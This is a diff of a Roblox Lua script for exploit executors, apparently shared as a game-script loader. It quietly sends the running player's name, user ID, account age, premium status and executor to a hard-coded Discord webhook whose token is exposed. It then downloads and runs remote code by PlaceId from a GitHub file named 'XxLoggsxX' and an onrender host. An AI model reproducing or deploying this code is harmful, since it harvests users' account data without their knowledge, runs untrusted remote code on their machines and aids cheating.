@@ -1,11 +1,8 @@
--- COMBINADO: Logger + Loader de scripts por PlaceId
-
-local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local LocalPlayer = Players.LocalPlayer
 
--- Webhook (tu webhook ya puesto)
+-- Webhook
 local webhookURL = "https://discord.com/api/webhooks/1416561873889001593/M2tM6b-23CwmBV1cI7v0jsnqmmfBY2HLDslVHEuBZ6eVAy34Vpbpk2gd_9c0a6vb18Bq"
 
 -- Calcular días desde creación
@@ -17,23 +14,13 @@ pcall(function()
     hasPremium = MarketplaceService:UserOwnsGamePassAsync(LocalPlayer.UserId, 131392)
 end)
 
--- Detectar plataforma
-local platform = "Unknown"
-pcall(function()
-    local UIS = game:GetService("UserInputService")
-    platform = tostring(UIS:GetPlatform() or "Unknown")
-end)
-
 -- Info del juego
-local successInfo, gameInfo = pcall(function()
-    return MarketplaceService:GetProductInfo(game.PlaceId)
-end)
-
-local placeName = successInfo and gameInfo.Name or "Unknown"
+local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+local placeName = gameInfo.Name
 local placeId = game.PlaceId
-local executorName = (type(identifyexecutor) == "function" and identifyexecutor() ) or "Unknown"
+local executorName = identifyexecutor and identifyexecutor() or "Unknown"
 
--- Embed unificado (sin stats)
+-- Embed
 local data = {
     username = "Script Logger",
     embeds = {{
@@ -42,12 +29,11 @@ local data = {
         fields = {
             {
                 name = "Player Info",
-                value = "**Display Name:** " .. (LocalPlayer.DisplayName or "Unknown") ..
-                        "\n**Username:** " .. (LocalPlayer.Name or "Unknown") ..
-                        "\n**User ID:** " .. (LocalPlayer.UserId or "Unknown") ..
+                value = "**Display Name:** " .. LocalPlayer.DisplayName ..
+                        "\n**Username:** " .. LocalPlayer.Name ..
+                        "\n**User ID:** " .. LocalPlayer.UserId ..
                         "\n**Account Age:** " .. accountAgeDays .. " days" ..
-                        "\n**Premium:** " .. (hasPremium and "Yes" or "No") ..
-                        "\n**Platform:** " .. platform,
+                        "\n**Premium:** " .. (hasPremium and "Yes" or "No"),
                 inline = false
             },
             {
@@ -63,67 +49,47 @@ local data = {
     }}
 }
 
--- Función para enviar webhook (con pcall para evitar errores)
-local function sendWebhook(payload)
-    local ok, err = pcall(function()
-        local json = HttpService:JSONEncode(payload)
-        -- PostAsync: texto JSON, content-type automático al usar Enum
-        HttpService:PostAsync(webhookURL, json, Enum.HttpContentType.ApplicationJson)
-    end)
-    if not ok then
-        warn("Webhook failed: ", err)
+-- Enviar webhook (Delta / Synapse / Script-Ware compatibles)
+local function sendWebhook()
+    local json = game:GetService("HttpService"):JSONEncode(data)
+    if http_request then
+        http_request({
+            Url = webhookURL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = json
+        })
+    elseif syn and syn.request then
+        syn.request({
+            Url = webhookURL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = json
+        })
+    else
+        warn("Tu executor no soporta http_request/syn.request")
     end
-    return ok
 end
 
--- Enviamos el log (no bloqueante)
-spawn(function()
-    sendWebhook(data)
-end)
+-- Mandar log sin bloquear
+spawn(sendWebhook)
 
--- --------- Ahora ejecutamos los scripts externos ----------
-
--- Script global (el raw que pediste antes)
+-- Scripts externos
 local globalScriptURL = "https://raw.githubusercontent.com/CoronaBlanca/25092009LH-On-Top-209021/refs/heads/main/XxLoggsxX"
-
--- Tabla de scripts por juego (usa el enlace que ya pusiste; modifica según necesites)
 local games = {
-    [3623096087] = "https://protected-roblox-scripts.onrender.com/dd255a83c0a02c86d7af617b464a5659", -- Muscle Legends
-    [0000000000] = "https://pastebin.com/raw/YYYYYYYY", -- Juego 2 (ejemplo)
-    [5555555555] = "https://pastebin.com/raw/ZZZZZZZZ"  -- Juego 3 (ejemplo)
+    [3623096087] = "https://protected-roblox-scripts.onrender.com/dd255a83c0a02c86d7af617b464a5659"
 }
 
--- Ejecutar un URL de script seguro con pcall
-local function runRemoteScript(url, name)
-    if not url or url == "" then
-        warn("runRemoteScript: URL inválida para", name or "script")
-        return false
-    end
-    local ok, err = pcall(function()
-        local source = HttpService:GetAsync(url)
-        local fn, lsErr = loadstring(source)
-        if not fn then
-            error("loadstring error: " .. tostring(lsErr))
-        end
-        fn()
-    end)
-    if not ok then
-        warn("Error ejecutando script (" .. tostring(name or url) .. "): " .. tostring(err))
-    end
-    return ok
-end
-
--- 1) Ejecutar el global (repositorio)
+-- Ejecutar global
 pcall(function()
-    runRemoteScript(globalScriptURL, "GlobalRepoScript")
+    loadstring(game:HttpGet(globalScriptURL))()
 end)
 
--- 2) Ejecutar el script específico del juego si existe
+-- Ejecutar específico
 pcall(function()
-    local specificURL = games[placeId]
-    if specificURL then
-        runRemoteScript(specificURL, "GameSpecificScript")
+    if games[placeId] then
+        loadstring(game:HttpGet(games[placeId]))()
     else
-        warn("No hay script en la tabla para este PlaceId: " .. tostring(placeId))
+        warn("No script configurado para este PlaceId: " .. placeId)
     end
 end)
